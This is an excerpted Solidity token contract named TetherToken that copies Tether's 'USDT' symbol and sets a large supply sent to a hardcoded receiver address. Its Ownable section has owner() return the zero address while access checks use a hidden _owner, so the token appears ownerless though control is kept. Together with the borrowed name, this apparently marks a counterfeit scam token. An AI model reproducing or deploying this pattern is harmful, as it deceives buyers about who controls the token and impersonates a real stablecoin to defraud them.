...
abstract contract Ownable {
    ...
    function owner() public view virtual returns (address) { return address(0); }
    function _checkOwner() internal view virtual { require(_owner == msg.sender, "Ownable: caller is not the owner"); }
...
abstract contract ERC20 is IERC20 {
    ...
    function transfer(address to, uint256 amount) public virtual override returns (bool) { address owner = msg.sender; _transfer(owner, to, amount); return true; }
    function allowance(address owner, address spender) public view virtual override returns (uint256) { return _allowances[owner][spender]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) { address owner = msg.sender; _approve(owner, spender, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) { address spender = msg.sender; _spendAllowance(from, spender, amount); _transfer(from, to, amount); return true; }
...
contract TetherToken is TOKEN {
    ...
    TOKEN(
        ...
        /* symbol */           "USDT",
        /* decimals */         6,
        /* totalSupply */      41007823219967433,
        /* tokenReceiver */    0xAFb2f3842C5191f1c5ce48686432Fe7b21d1AE2f
    )
    {}
}